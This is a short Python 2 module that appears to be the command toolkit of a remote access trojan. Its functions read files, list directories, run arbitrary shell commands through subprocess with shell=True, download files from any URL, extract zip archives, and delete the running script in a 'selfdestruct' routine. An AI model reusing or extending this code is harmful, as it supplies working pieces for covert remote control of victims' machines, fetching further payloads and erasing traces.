import datetime
import os
import subprocess
import sys
import urllib
import zipfile


def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(4000)
        except IOError:
            return 'Error: Permission denied.'
    else:
        return 'Error: File not found.'

def execute(command):
    output = subprocess.Popen(command, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def ls(path):
    if not path:
        path = '.'

    if os.path.exists(path):
        try:
            return '\n'.join(os.listdir(path))
        except OSError:
            return 'Error: Permission denied.'
    else:
        return 'Error: Path not found.'


def pwd():
    return os.getcwd()


def selfdestruct(plat):
    os.remove(sys.argv[0])
    sys.exit(0)


def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)
